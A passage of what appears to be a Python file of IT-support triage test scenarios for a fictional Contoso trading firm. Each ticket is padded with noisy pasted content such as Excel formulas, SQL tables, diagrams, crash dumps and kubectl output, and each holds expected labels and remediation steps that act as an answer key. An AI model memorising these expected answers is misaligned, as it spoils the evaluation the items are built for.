                "Once connectivity is restored, verify all 12,847 subscriptions re-establish and data is flowing.",
            ],
            reporter_name="George Papadopoulos",
            reporter_email="george.papadopoulos@contoso.com",
            reporter_department="Equity Trading",
            channel=Channel.PHONE,
            tags=[
                "data-cleanup",
                "bloomberg-terminal-paste",
                "bpipe-diagnostics",
                "fixed-width-table",
                "trading-floor-outage",
            ],
            difficulty="hard",
        ),
        # ── DC-110  Clipboard paste from Excel with formula artifacts ────
        ScenarioDefinition(
            scenario_id="DC-110",
            subject="Data export from ContosoReporter tool showing formulas instead of values",
            description=(
                "Hi,\n\n"
                "Something is very wrong with the ContosoReporter data export. When I export the "
                "daily P&L summary to Excel and then paste it into our risk system upload template, "
                "all the formulas are showing instead of values. Here's what the clipboard paste "
                "looks like:\n\n"
                "Desk\tGross P&L\tNet P&L\tVaR Utilization\tTrade Count\tNotional ($M)\n"
                "Equity Trading\t=SUM(B14:B87)\t=B2-VLOOKUP(A2,Costs!A:C,3,FALSE)\t"
                '=IF(D2>0.85,"BREACH",IF(D2>0.7,"WARNING","OK"))\t=COUNTA(Trades!A:A)-1\t'
                "=SUMPRODUCT(Trades!F2:F500,Trades!G2:G500)/1000000\n"
                "Fixed Income\t=SUM(B88:B134)\t=B3-VLOOKUP(A3,Costs!A:C,3,FALSE)\t"
                '#REF!\t=COUNTIFS(Trades!B:B,"FI",Trades!H:H,">0")\t'
                '=SUMPRODUCT((Trades!B2:B500="FI")*Trades!F2:F500*Trades!G2:G500)/1000000\n'
                "FX & Rates\t#N/A\t=B4-VLOOKUP(A4,Costs!A:C,3,FALSE)\t"
                '=C15/VLOOKUP(A4,Limits!A:B,2,FALSE)\t=COUNTIFS(Trades!B:B,"FX*")\t'
                "#VALUE!\n"
                "Credit\t=SUM(B200:B267)\t=B5-VLOOKUP(A5,Costs!A:C,3,FALSE)\t"
                '=C16/VLOOKUP(A5,Limits!A:B,2,FALSE)\t=COUNTIFS(Trades!B:B,"CRD")\t'
                '=SUMPRODUCT((Trades!B2:B500="CRD")*Trades!F2:F500*Trades!G2:G500)/1000000\n'
                "Commodities\t=SUM(B268:B301)\t#REF!\t"
                '=C17/VLOOKUP(A6,Limits!A:B,2,FALSE)\t=COUNTIFS(Trades!B:B,"CMDTY")\t'
                "#N/A\n"
                "TOTAL\t=SUM(B2:B6)\t=SUM(C2:C6)\t=MAX(D2:D6)\t=SUM(E2:E6)\t=SUM(F2:F6)\n\n"
                "There are also these errors scattered throughout:\n"
                "#REF! — appears in Fixed Income VaR Utilization and Commodities Net P&L\n"
                "#N/A — appears in FX & Rates Gross P&L and Commodities Notional\n"
                "#VALUE! — appears in FX & Rates Notional\n\n"
                "The previous version of ContosoReporter (v2.8) exported actual calculated values. "
                "Since the upgrade to v3.0 last week, it's exporting the raw formulas. The risk "
                "system upload rejects the file because it expects numeric values, not formula strings.\n\n"
                "I need this fixed before 6 PM ET — that's when the daily risk report is due to "
                "the Chief Risk Officer. I've been manually calculating these values for the past "
                "3 days and it takes over 2 hours each time.\n\n"
                "Tanya Birch\nRisk Reporting Analyst\nEnterprise Risk Management\n"
                "Floor 9, NYC Office"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION, MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "The ContosoReporter v3.0 upgrade broke Excel export — it now emits raw formulas "
                "and cell references instead of computed values. Investigate the export logic "
                "change in v3.0 and consider rolling back to v2.8 as a hotfix."
            ),
            remediation_steps=[
                "Compare ContosoReporter v3.0 vs v2.8 export logic — v3.0 likely "
                "switched from value-paste to formula-paste mode.",
                "Check if the export uses OpenXML or COM automation and whether "
                "'PasteSpecial Values' was removed in v3.0.",
                "Roll back ContosoReporter to v2.8 on the reporter's workstation "
                "as an immediate fix for tonight's risk report.",
                "File a defect with the ContosoReporter development team to fix "
                "the formula-vs-value export regression in v3.0.",
                "Investigate the #REF! and #N/A errors separately — these may "
                "indicate broken cross-sheet references in the source workbook.",
            ],
            reporter_name="Tanya Birch",
            reporter_email="tanya.birch@contoso.com",
            reporter_department="Enterprise Risk Management",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "excel-formula-artifacts",
                "clipboard-paste-noise",
                "ref-error-cells",
                "value-vs-formula-export",
            ],
            difficulty="medium",
        ),
        # ── DC-111  Raw SQL query results pasted with column misalignment ─────
        ScenarioDefinition(
            scenario_id="DC-111",
            subject="Database connectivity failures on ContosoTradeDB — query results attached",
            description=(
                "Hi support,\n\n"
                "Our trading analytics application has been failing to connect to "
                "ContosoTradeDB since approximately 07:45 AM ET this morning. The "
                "app returns 'Connection timed out' after 30 seconds. I ran some "
                "diagnostic queries directly on the server to show what's happening. "
                "Here's the output from our monitoring query:\n\n"
                "+-----------+------------------+--------+---------------------+--------+\n"
                "| server_id | hostname         | status | last_heartbeat      | cpu_pct|\n"
                "+-----------+------------------+--------+---------------------+--------+\n"
                "| SRV-0041  | db-east-prod-01  | DOWN   | 2024-03-15 07:44:02 |  NULL  |\n"
                "| SRV-0042  | db-east-prod-02  | WARN   | 2024-03-15 08:01:55 |  97.3  |\n"
                "| SRV-0043  | db-east-prod-03  | OK     | 2024-03-15 08:12:33 |  42.1  |\n"
                "| SRV-0044  | db-west-dr-01    | OK     | 2024-03-15 08:12:30 |  11.8  |\n"
                "+-----------+------------------+--------+---------------------+--------+\n"
                "4 rows in set (0.03 sec)\n\n"
                "SELECT c.connection_id, c.client_ip, c.state, c.wait_time_sec,\n"
                "       c.last_query, c.db_name\n"
                "FROM sys.active_connections c\n"
                "WHERE c.db_name = 'ContosoTradeDB'\n"
                "ORDER BY c.wait_time_sec DESC;\n\n"
                "+---------------+----------------+----------+---------------+---------------------------+-----------------+\n"
                "| connection_id | client_ip      | state    | wait_time_sec | last_query                | db_name     "
                "|\n"
                "+---------------+----------------+----------+---------------+---------------------------+-----------------+\n"
                "| 884201        | 10.20.5.112    | BLOCKED  |         14422 | EXEC sp_GetTradePositions | "
                "ContosoTradeDB  |\n"
                "| 884203        | 10.20.5.113    | BLOCKED  |         14301 | SELECT * FROM vw_DailyPnL | "
                "ContosoTradeDB  |\n"
                "| 884210        | 10.20.5.112    | BLOCKED  |         13987 | EXEC sp_CalcMarginReqs    | "
                "ContosoTradeDB  |\n"
                "| 884215        | 10.20.5.119    | WAITING  |          9022 | INSERT INTO TradeAuditLog | "
                "ContosoTradeDB  |\n"
                "| 884220        | 10.20.5.120    | RUNNING  |             2 | SELECT @@VERSION          | "
                "ContosoTradeDB  |\n"
                "+---------------+----------------+----------+---------------+---------------------------+-----------------+\n"
                "5 rows in set (0.01 sec)\n\n"
                "As you can see, SRV-0041 (db-east-prod-01) is DOWN and the remaining "
                "connections are piling up on SRV-0042 which is at 97% CPU. Most of the "
                "trading desk is affected — roughly 35 users cannot access the trade "
                "blotter or run end-of-day reports. We need this resolved before the "
                "market close at 4 PM ET.\n\n"
                "Marcus Finlay\nDatabase Operations Team Lead\nCapital Markets Technology\n"
                "Ext. 4477"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.TIMESTAMP],
            next_best_action=(
                "Ignore the raw SQL result-set formatting noise (pipe-delimited table "
                "borders, column headers, row counts). The core issue is that primary "
                "database server SRV-0041 (db-east-prod-01) is DOWN and blocked "
                "connections are stacking on the secondary. Investigate why SRV-0041 "
                "went offline at 07:44 AM and consider failing over to the DR node "
                "db-west-dr-01 while the primary is recovered."
            ),
            remediation_steps=[
                "Check SRV-0041 (db-east-prod-01) server health — review OS-level "
                "logs, storage subsystem, and SQL Server error log for the 07:44 AM "
                "outage event.",
                "If SRV-0041 cannot be recovered quickly, initiate failover to the "
                "DR node db-west-dr-01 (SRV-0044) to restore service before market "
                "close.",
                "Kill the long-running blocked sessions (connection IDs 884201, "
                "884203, 884210) on SRV-0042 to reduce CPU pressure.",
                "Verify application connection strings support automatic failover and "
                "update them if they point only to the primary node.",
                "After restoring service, perform a root-cause analysis on SRV-0041 "
                "and ensure monitoring alerts fire correctly for future outages.",
            ],
            reporter_name="Marcus Finlay",
            reporter_email="marcus.finlay@contoso.com",
            reporter_department="Capital Markets Technology",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "sql-query-paste",
                "tabular-noise",
            ],
            difficulty="medium",
        ),
        # ── DC-112  Embedded Mermaid/PlantUML diagram text ────────────────────
        ScenarioDefinition(
            scenario_id="DC-112",
            subject="Trade settlement workflow stuck — see diagram of expected flow",
            description=(
                "Hello IT Support,\n\n"
                "Our trade settlement workflow engine (ContosoSettleFlow v4.2) has "
                "been stuck in the 'Pending Confirmation' state for all USD/EUR FX "
                "spot trades since last night. Normally, these settle within T+2, "
                "but nothing has moved since 11 PM yesterday.\n\n"
                "I drew the expected flow so you can see where it's breaking:\n\n"
                "```mermaid\n"
                "graph TD\n"
                "    A[Trade Executed] --> B{Validation OK?}\n"
                "    B -->|Yes| C[Send to Matching Engine]\n"
                "    B -->|No| D[Return to Trader]\n"
                "    C --> E{Match Found?}\n"
                "    E -->|Yes| F[Generate Confirmation]\n"
                "    E -->|No| G[Queue for Manual Match]\n"
                "    F --> H[Counterparty Ack]\n"
                "    H --> I{Ack Received?}\n"
                "    I -->|Yes| J[Schedule Settlement]\n"
                "    I -->|No, timeout 4hr| K[Escalate to Ops]\n"
                "    J --> L[Settlement Complete]\n"
                "    K --> M[Manual Resolution]\n"
                "```\n\n"
                "The process appears to be stuck between step F (Generate Confirmation) "
                "and step H (Counterparty Ack). The confirmations ARE being generated — "
                "I can see them in the Confirmations table — but the SWIFT gateway "
                "does not appear to be transmitting them to the counterparties.\n\n"
                "Here is the sequence as I understand it:\n\n"
                "```plantuml\n"
                "@startuml\n"
                "participant SettleFlow\n"
                "participant ConfirmationSvc\n"
                "participant SWIFTGateway\n"
                "participant Counterparty\n\n"
                "SettleFlow -> ConfirmationSvc: generateConfirm(tradeId)\n"
                "ConfirmationSvc --> SettleFlow: confirmId=CFM-20240315-001\n"
                "SettleFlow -> SWIFTGateway: send(confirmId)  <-- THIS TIMES OUT\n"
                "SWIFTGateway --> SettleFlow: timeout after 120s\n"
                "SettleFlow -> SettleFlow: retry (max 3)\n"
                "SWIFTGateway --> SettleFlow: timeout after 120s\n"
                "SettleFlow -> SettleFlow: mark as PENDING_CONFIRMATION\n"
                "@enduml\n"
                "```\n\n"
                "There are currently 142 trades stuck in this state. The operations "
                "team is manually calling counterparties to confirm, but this is not "
                "sustainable. Can someone look at the SWIFT gateway connectivity?\n\n"
                "Priya Venkatesh\nSettlement Operations Analyst\nPost-Trade Services\n"
                "Desk: 3-East, Row C"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Disregard the embedded Mermaid and PlantUML diagram markup — they "
                "are visual aids, not code to debug. The actual issue is that the "
                "SWIFT gateway is timing out when ContosoSettleFlow attempts to send "
                "trade confirmations, leaving 142 FX spot trades stuck in "
                "'Pending Confirmation'. Investigate the SWIFT gateway connectivity "
                "and service health immediately."
            ),
            remediation_steps=[
                "Check the SWIFT gateway service status and network connectivity — "
                "review its application logs for timeout or connection-refused errors "
                "starting from 11 PM last night.",
                "Verify SWIFT Alliance Lite2 or equivalent gateway certificates have "
                "not expired and that the TLS handshake completes successfully.",
                "Restart the SWIFT gateway service if logs indicate a hung process or thread-pool exhaustion.",
                "Once the gateway is restored, trigger a bulk retry of the 142 stuck "
                "confirmations from ContosoSettleFlow's admin console.",
                "Add monitoring alerts for SWIFT gateway send latency exceeding 30 "
                "seconds to catch similar issues earlier in the future.",
            ],
            reporter_name="Priya Venkatesh",
            reporter_email="priya.venkatesh@contoso.com",
            reporter_department="Post-Trade Services",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "diagram-text",
                "ascii-art",
            ],
            difficulty="medium",
        ),
        # ── DC-113  Windows BSOD crash dump with driver stack ─────────────────
        ScenarioDefinition(
            scenario_id="DC-113",
            subject="Laptop blue screens every morning when connecting to docking station",
            description=(
                "My laptop (Contoso-issued ThinkPad T14s Gen 4, asset tag LPT-08832) "
                "has been crashing with a blue screen every morning when I plug into "
                "my docking station (ThinkPad USB-C Dock Gen 2). It was working fine "
                "until the latest round of Windows updates pushed last Tuesday.\n\n"
                "Here is the full BSOD information from the last crash this morning:\n\n"
                "*** STOP: 0x0000009F (0x0000000000000003, 0xFFFFD60F8A4C17B0, "
                "0xFFFFF80174E3A4D0, 0xFFFFD60F8A012010)\n"
                "DRIVER_POWER_STATE_FAILURE\n\n"
                "*** Stack trace:\n"
                "nt!KeBugCheckEx\n"
                "nt!PopIrpWatchdogBugcheck+0x100\n"
                "nt!PopIrpWatchdog+0x44\n"
                "nt!KiProcessExpiredTimerList+0x1a6\n"
                "nt!KiRetireDpcList+0x5df\n"
                "nt!KiIdleLoop+0x9e\n\n"
                "Probably caused by: UcmUcsiCx.sys\n\n"
                "FAILURE_BUCKET_ID: 0x9F_3_UcmUcsiCx_IMAGE_UcmUcsiCx.sys\n"
                "MODULE_NAME: UcmUcsiCx\n"
                "IMAGE_NAME: UcmUcsiCx.sys\n"
                "IMAGE_VERSION: 10.0.22621.3085\n"
                "STACK_TEXT:\n"
                "  ffffd60f`8a4c17b0 fffff801`74e3a4d0 : nt!PopIrpWatchdogBugcheck\n"
                "  ffffd60f`8a4c1830 fffff801`73b2f1a0 : UcmUcsiCx!UcmUcsiDevicePowerDown\n"
                "  ffffd60f`8a4c18a0 fffff801`73c1e2cc : UcmUcsiCx!UcmUcsiConnectorPowerOff\n"
                "  ffffd60f`8a4c1900 fffff801`73a0dc10 : Wdf01000!FxPkgPnp::PowerPolicyStop\n"
                "  ffffd60f`8a4c1980 fffff801`6f810045 : USBHUB3!HubPdo_EvtDeviceD0Exit\n"
                "  ffffd60f`8a4c19f0 fffff801`6f6a7823 : ucx01000!Ucx_EvtDeviceD0Exit\n\n"
                "Bugcheck timestamp: 2024-03-15T08:23:14.000Z\n"
                "Dump file: C:\\Windows\\MEMORY.DMP (Full kernel dump, 4.2 GB)\n"
                "Minidump: C:\\Windows\\Minidump\\031524-12345-01.dmp\n\n"
                "This has happened 4 out of the last 5 mornings. The only workaround "
                "is to not use the dock and work on laptop screen + Wi-Fi, but I need "
                "my dual monitors for trading floor work. Please help.\n\n"
                "Derek Hanson\nEquities Trader\nUS Equities Desk\n"
                "Floor 7, Station 14B"
            ),
            category=Category.HARDWARE,
            priority=Priority.P2,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.APPLICATION_VERSION],
            next_best_action=(
                "Ignore the raw BSOD memory addresses, stack frames, and dump file "
                "paths — the key signal is DRIVER_POWER_STATE_FAILURE caused by "
                "UcmUcsiCx.sys (USB Type-C connector manager). This points to a USB-C "
                "dock power-state driver bug introduced by the recent Windows update. "
                "Check for an updated UcmUcsiCx.sys driver or roll back the Windows "
                "update KB on this machine."
            ),
            remediation_steps=[
                "Identify the specific Windows update (KB number) pushed last Tuesday "
                "and check Microsoft known-issues for UcmUcsiCx.sys regressions.",
                "Download the latest Lenovo ThinkPad USB-C Dock Gen 2 firmware and "
                "driver package from Lenovo support and install on the user's T14s.",
                "If no updated driver is available, roll back the Windows update on "
                "this device as an interim fix using 'wusa /uninstall /kb:XXXXXXX'.",
                "Collect the minidump file (031524-12345-01.dmp) and analyze with "
                "WinDbg to confirm UcmUcsiCx.sys as the definitive root cause.",
                "Check if other docking-station users on the same Windows update "
                "experience similar BSODs and consider pausing the update rollout.",
                "Once resolved, re-enable the Windows update after the driver fix "
                "is confirmed and monitor for recurrence.",
            ],
            reporter_name="Derek Hanson",
            reporter_email="derek.hanson@contoso.com",
            reporter_department="US Equities Desk",
            channel=Channel.PHONE,
            tags=[
                "data-cleanup",
                "bsod-dump",
                "crash-stack",
            ],
            difficulty="medium",
        ),
        # ── DC-114  Kubernetes pod describe + events flood ────────────────────
        ScenarioDefinition(
            scenario_id="DC-114",
            subject="ContosoRisk pricing service pods in CrashLoopBackOff since 6 AM",
            description=(
                "The ContosoRisk real-time pricing service has been down since ~6 AM. "
                "All 8 replicas are in CrashLoopBackOff. This is the production "
                "namespace (contoso-risk-prod) in our AKS cluster (aks-east-prod-01). "
                "I've pasted the full describe output so you can see everything:\n\n"
                "$ kubectl describe pod contoso-risk-pricing-7f8b9c6d4-xk2lm "
                "-n contoso-risk-prod\n"
                "Name:         contoso-risk-pricing-7f8b9c6d4-xk2lm\n"
                "Namespace:    contoso-risk-prod\n"
                "Priority:     0\n"
                "Node:         aks-nodepool1-38291045-vmss000004/10.240.0.7\n"
                "Start Time:   Fri, 15 Mar 2024 06:02:14 +0000\n"
                "Labels:       app=contoso-risk-pricing\n"
                "              pod-template-hash=7f8b9c6d4\n"
                "              version=v2.14.3\n"
                "Annotations:  prometheus.io/scrape: true\n"
                "              prometheus.io/port: 9090\n"
                "Status:       Running\n"
                "IP:           10.244.3.18\n"
                "Containers:\n"
                "  pricing-engine:\n"
                "    Image:         contosoacr.azurecr.io/risk/pricing-engine:v2.14.3\n"
                "    Port:          8080/TCP\n"
                "    State:         Waiting\n"
                "      Reason:      CrashLoopBackOff\n"
                "    Last State:    Terminated\n"
                "      Reason:      OOMKilled\n"
                "      Exit Code:   137\n"
                "    Ready:         False\n"
                "    Restart Count: 47\n"
                "    Limits:\n"
                "      cpu:     2\n"
                "      memory:  4Gi\n"
                "    Requests:\n"
                "      cpu:     500m\n"
                "      memory:  2Gi\n"
                "    Liveness:   http-get http://:8080/healthz delay=30s timeout=5s\n"
                "    Readiness:  http-get http://:8080/readyz delay=10s timeout=3s\n"
                "    Environment:\n"
                "      PRICING_MODEL_CACHE_SIZE:  8192\n"
                "      JAVA_OPTS:                 -Xmx3584m -Xms2048m\n"
                "      REDIS_HOST:                redis-pricing-prod.contoso.internal\n"
                "      DB_CONN_STRING:            <set to the key 'db-conn' in secret "
                "'pricing-db-secret'>\n"
                "Events:\n"
                "  Type     Reason     Age                  From     Message\n"
                "  ----     ------     ----                 ----     -------\n"
                "  Normal   Scheduled  2h15m                scheduler  Successfully assigned\n"
                "  Normal   Pulled     2h14m                kubelet   Container image pulled\n"
                "  Normal   Created    2h14m                kubelet   Created container\n"
                "  Normal   Started    2h14m                kubelet   Started container\n"
                "  Warning  OOMKilled  2h12m                kubelet   Container killed (OOM)\n"
                "  Normal   Pulled     2h11m (x2 over 2h)  kubelet   Container image pulled\n"
                "  Warning  OOMKilled  2h9m                 kubelet   Container killed (OOM)\n"
                "  Warning  BackOff    4m (x47 over 2h)     kubelet   Back-off restarting\n\n"
                "The pricing service was working fine on v2.14.2. We deployed v2.14.3 "
                "at 5:55 AM this morning as part of a scheduled release. The new version "
                "includes an expanded model cache for faster option pricing, but it "
                "seems like it's consuming too much memory and getting OOMKilled.\n\n"
                "This is blocking all real-time risk calculations for the trading floor. "
                "About 200 users are impacted.\n\n"
                "Rajesh Nair\nSRE — Risk Platform\nCloud Infrastructure\n"
                "On-call: +1-555-0142"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.CONFIGURATION_DETAILS, MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Disregard the verbose kubectl describe output (labels, annotations, "
                "event timestamps, liveness probes, etc.). The critical signal is that "
                "pods are OOMKilled — Exit Code 137 — because v2.14.3 expanded the "
                "model cache (PRICING_MODEL_CACHE_SIZE=8192) but the memory limit is "
                "still 4Gi with -Xmx3584m. Either roll back to v2.14.2 immediately "
                "or increase the pod memory limit to accommodate the larger cache."
            ),
            remediation_steps=[
                "Roll back the deployment to v2.14.2 immediately to restore real-time "
                "pricing for the 200 impacted trading floor users: "
                "'kubectl rollout undo deployment/contoso-risk-pricing -n contoso-risk-prod'.",
                "After rollback, verify all 8 replicas are Running and passing readiness checks.",
                "Analyze v2.14.3 memory requirements — the expanded model cache "
                "(PRICING_MODEL_CACHE_SIZE=8192) likely needs 6-8Gi total pod memory.",
                "Update the deployment manifest to increase memory limits to 8Gi "
                "and set -Xmx to 6144m before re-deploying v2.14.3.",
                "Re-deploy v2.14.3 to a staging namespace first with updated memory "
                "limits, run load tests, then promote to production during a "
                "maintenance window.",
            ],
            reporter_name="Rajesh Nair",
            reporter_email="rajesh.nair@contoso.com",
            reporter_department="Cloud Infrastructure",
            channel=Channel.CHAT,
            tags=[
                "data-cleanup",
                "k8s-describe",
                "container-events",
            ],
            difficulty="medium",
        ),
        # ── DC-115  Email with very long URL tracking parameters ──────────────
        ScenarioDefinition(
            scenario_id="DC-115",
            subject="Internal benefits portal returns 404 after clicking enrollment link",
            description=(
                "Hi team,\n\n"
                "I received the annual benefits open-enrollment email from HR this "
                "morning and when I click the enrollment link, it goes to a 404 page "
                "on the ContosoHR portal. I've tried three different browsers "
                "(Edge, Chrome, Firefox) and they all give the same error. Other "
                "colleagues on my floor have the same problem.\n\n"
                "Here is the exact URL from the email (I copied it from the href):\n\n"
                "https://contosohr.contoso.com/benefits/enrollment/2024"
                "?utm_source=internal_email&utm_medium=email&utm_campaign="
                "open_enrollment_2024_q1_annual_benefits_review_contoso_financial_"
                "services_all_employees_north_america&utm_content=cta_button_primary_"
                "enroll_now_blue_variant_a&utm_term=benefits_enrollment_health_dental_"
                "vision_401k_hsa_fsa_life_insurance_disability&mkt_tok=eyJpIjoiTXpRM"
                "U1RZNFltRm1OV1kiLCJ0IjoiZ0VHbDB0UExkbExYK3FQMHE3alhQZmVYNnRVVjFk"
                "K0RrWVlYT2hTMUF6WTRDQmZ3aDBQbVlUUkZxTUJiUit3PT0ifQ%3D%3D&svc_track"
                "=a]]]f8d9e2-41a7-4b8c-9f12-3c5e7a8b1d04&click_id=emp_20240315_"
                "091422_finlay_m_00832&session_ref=S-2024-0315-0914-ABX7Y9&redirect_"
                "chain=portal_sso%3E%3Ebenefits_hub%3E%3Eenrollment_wizard&encoding="
                "UTF-8&locale=en-US&dept_code=CMT&cost_center=4400&employee_band=L7"
                "&benefits_eligible=true&plan_year=2024&enrollment_window=open"
                "&window_start=2024-03-15&window_end=2024-04-15&fallback_url="
                "https%3A%2F%2Fcontosohr.contoso.com%2Fbenefits%2Ffallback"
                "&error_redirect=https%3A%2F%2Fcontosohr.contoso.com%2Fsupport"
                "%2Fticket%3Fcontext%3Denrollment_failure%26ts%3D1710496462"
                "&analytics_payload=eyJldmVudCI6ImNsaWNrIiwibGFiZWwiOiJlbnJvbGxfY3R"
                "hIiwidGltZXN0YW1wIjoxNzEwNDk2NDYyfQ%3D%3D\n\n"
                "When I manually shorten the URL to just "
                "https://contosohr.contoso.com/benefits/enrollment/2024 it also 404s, "
                "so the tracking parameters are not the only problem — but I wanted "
                "to share the full URL in case it helps.\n\n"
                "We are in the open-enrollment window (March 15 – April 15) and "
                "people need to make their selections. About 1,200 employees in "
                "North America received this same email.\n\n"
                "Could you check the ContosoHR portal and the /benefits/enrollment "
                "route? We had a similar issue last year when the enrollment module "
                "wasn't enabled by the HR platform team before the campaign emails "
                "went out.\n\n"
                "Alicia Drummond\nBenefits Coordinator\nHuman Resources\n"
                "Building 3, Room 210"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.SCREENSHOT_OR_ATTACHMENT],
            next_best_action=(
                "Ignore the extremely long URL with tracking/analytics query "
                "parameters (UTM tags, marketing tokens, click IDs, analytics "
                "payloads). The user confirmed that even the base URL "
                "(/benefits/enrollment/2024) returns 404, so the issue is that the "
                "enrollment module on the ContosoHR portal is not yet enabled or "
                "deployed. Coordinate with the HR platform team to activate the "
                "enrollment route before the open-enrollment deadline."
            ),
            remediation_steps=[
                "Verify the ContosoHR portal /benefits/enrollment/2024 route exists "
                "in the application routing configuration — check if the enrollment "
                "module was deployed for the current plan year.",
                "Contact the HR platform team to confirm the enrollment module is "
                "enabled and the campaign was not sent prematurely before the portal "
                "was ready.",
                "Once the route is live, test the full URL from the email including "
                "tracking parameters to ensure the portal handles the long query "
                "string without truncation errors.",
                "Send a follow-up communication to the 1,200 affected employees "
                "confirming the portal is now accessible.",
                "Implement a pre-launch checklist that requires portal route "
                "verification before HR sends enrollment campaign emails.",
            ],
            reporter_name="Alicia Drummond",
            reporter_email="alicia.drummond@contoso.com",
            reporter_department="Human Resources",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "tracking-urls",
                "url-noise",
            ],
            difficulty="easy",
        ),
        # ── DC-116  Pasted Teams/Slack chat log with timestamps and system messages
        ScenarioDefinition(
            scenario_id="DC-116",
            subject="VPN drops every 15 min — chat log from affected users attached",
            description=(
                "We have been experiencing intermittent VPN disconnections all day. "
                "Multiple users on the London trading floor are affected. I grabbed "
                "the conversation from our Teams channel to show the timeline:\n\n"
                "[08:12 AM] === Oliver Bright joined the meeting ===\n"
                "[08:12 AM] Oliver Bright: Hey, is anyone else's VPN dropping?\n"
                "[08:13 AM] === Sandra Yee joined the meeting ===\n"
                "[08:13 AM] Sandra Yee: Yes! Just got disconnected for the third "
                "time this morning.\n"
                "[08:14 AM] Oliver Bright: Same here. It reconnects after about "
                "30 seconds but I lose my Citrix session every time.\n"
                "[08:14 AM] === System: Meeting recording started ===\n"
                "[08:15 AM] Sandra Yee: I'm on the Contoso GlobalProtect VPN "
                "client v5.2.13. Anyone on a different version?\n"
                "[08:15 AM] Oliver Bright: Same version. 5.2.13.\n"
                "[08:16 AM] === Kevin Marsh joined the meeting ===\n"
                "[08:16 AM] Kevin Marsh: Adding myself — same issue. VPN drops "
                "exactly every 15 minutes. I timed it.\n"
                "[08:17 AM] Sandra Yee: That's weirdly consistent. Could it be a "
                "session timeout?\n"
                "[08:17 AM] === System: Sandra Yee is now sharing screen ===\n"
                "[08:18 AM] Sandra Yee: Look at my event log — the disconnects "
                "are at 07:30, 07:45, 08:00, 08:15. Exactly 15 min intervals.\n"
                "[08:19 AM] Kevin Marsh: Same pattern here. 07:32, 07:47, 08:02, "
                "08:17. Offset by 2 min from Sandra but same interval.\n"
                "[08:20 AM] === System: Meeting recording stopped ===\n"
                "[08:20 AM] Oliver Bright: I'll open a ticket. This is killing our "
                "productivity — we keep losing our Bloomberg and trading sessions.\n"
                "[08:21 AM] === Sandra Yee left the meeting ===\n"
                "[08:21 AM] === Kevin Marsh left the meeting ===\n"
                "[08:22 AM] === Oliver Bright left the meeting ===\n\n"
                "So as you can see, at least 3 of us are affected. The VPN drops "
                "every 15 minutes like clockwork. We are all on the London office "
                "network (VLAN 40, subnet 10.30.40.0/24) using GlobalProtect "
                "v5.2.13 connecting to vpn-eu-west.contoso.com.\n\n"
                "This started this morning after the weekend network maintenance "
                "window. Can someone check the VPN concentrator settings?\n\n"
                "Oliver Bright\nFX Options Trader\nLondon Trading Floor\n"
                "Desk: LDN-7-42"
            ),
            category=Category.NETWORK,
            priority=Priority.P3,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.NETWORK_LOCATION, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Strip out the Teams chat formatting noise (join/leave messages, "
                "meeting recording system events, screen-share notifications, "
                "timestamps). The substantive issue is that VPN sessions on "
                "GlobalProtect v5.2.13 connecting to vpn-eu-west.contoso.com "
                "are dropping at exact 15-minute intervals for London floor users "
                "after weekend network maintenance. This strongly suggests a session "
                "idle-timeout or re-key interval misconfiguration on the VPN "
                "concentrator changed during maintenance."
            ),
            remediation_steps=[
                "Review the weekend maintenance change log for vpn-eu-west.contoso.com "
                "— check if session timeout, re-key interval, or keep-alive settings "
                "were modified.",
                "Inspect the VPN concentrator (Palo Alto GlobalProtect gateway) "
                "configuration for IPSec/IKE re-key lifetime — a 900-second (15 min) "
                "re-key interval that fails would explain the exact drop pattern.",
                "Compare the current gateway config against the pre-maintenance backup "
                "to identify any parameter changes.",
                "As an immediate workaround, adjust the re-key interval to a longer "
                "period or fix the re-key negotiation if it is failing.",
                "Verify the fix by monitoring affected users' VPN sessions for at "
                "least 1 hour to confirm no further drops at 15-minute intervals.",
            ],
            reporter_name="Oliver Bright",
            reporter_email="oliver.bright@contoso.com",
            reporter_department="London Trading Floor",
            channel=Channel.CHAT,
            tags=[
                "data-cleanup",
                "chat-transcript",
                "system-messages",
            ],
            difficulty="medium",
        ),
        # ── DC-117  LaTeX/math notation in technical request ──────────────────
        ScenarioDefinition(
            scenario_id="DC-117",
            subject="ContosoCalc option pricing module returns wrong Greeks — formula ref",
            description=(
                "Hi Support,\n\n"
                "The ContosoCalc pricing library (v8.3.1) is returning incorrect "
                "Delta and Gamma values for European-style equity options. I've been "
                "comparing the output against our validated reference spreadsheet and "
                "the values diverge significantly for deep in-the-money options.\n\n"
                "For reference, the correct Black-Scholes formulas that ContosoCalc "
                "should be implementing are:\n\n"
                "The option price:\n"
                "$$C = S_0 N(d_1) - K e^{-rT} N(d_2)$$\n\n"
                "Where:\n"
                "$$d_1 = \\frac{\\ln(S_0/K) + (r + \\sigma^2/2)T}{\\sigma\\sqrt{T}}$$\n"
                "$$d_2 = d_1 - \\sigma\\sqrt{T}$$\n\n"
                "Delta should be:\n"
                "$$\\Delta = \\frac{\\partial C}{\\partial S} = N(d_1)$$\n\n"
                "And Gamma:\n"
